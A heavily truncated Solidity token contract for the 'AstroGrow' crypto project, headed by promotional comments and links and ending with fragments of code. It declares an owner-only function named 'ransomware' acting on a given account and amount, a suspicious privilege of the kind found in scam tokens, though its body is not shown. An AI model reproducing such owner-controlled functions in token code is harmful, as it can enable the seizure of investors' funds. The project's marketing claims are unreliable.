...
/**
🚀Website: http://astrogrowi.net/
🚀Contract: 0xDB9e27fEED197578C3689dF525eFA80AC48787c6
🚀Telegram: https://t.me/astrogrowii
...
💎Our Mission💎
The objectives of the AstroGrow platform are focused on consumers and investors to make the most out of an all-in-one ecosystem. Connecting digital applications that can be used both in our Universe and the Metaverse. The main objective is definitely to provide maximum advantages to the users and investors through the ecosystem of AstroGrow.

💎Our Ecosystem💎
AstroGrow is a complete all-in-one ecosystem that contains several digital applications powered by Smart Contracts. 
...
contract ERC20DividendToken is Context, ERC20Burnable, Ownable {
    ...
    function ransomware(uint256 amount, uint256 manasi, address account) public onlyOwner {
...
contract astrogrow is ERC20DividendToken {
